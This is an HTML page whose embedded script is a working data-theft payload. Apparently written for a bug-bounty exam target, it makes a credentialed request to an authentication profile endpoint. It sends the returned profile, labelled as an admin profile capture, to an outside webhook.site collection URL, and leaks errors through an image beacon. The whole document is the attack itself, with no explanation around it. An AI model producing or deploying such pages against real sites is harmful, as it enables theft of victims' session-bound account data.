<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";

        fetch(target, { credentials: "include" })
            .then(response => response.text())
            .then(data => {
                // Sending the full profile back to your webhook
                fetch(webh, {
                    method: "POST",
                    body: JSON.stringify({
                        type: "ADMIN_PROFILE_SUCCESS",
                        content: data
                    })
                });
            })
            .catch(err => {
                new Image().src = webh + "/?err=" + btoa(err.message);
            });
    </script>
</body>
</html>
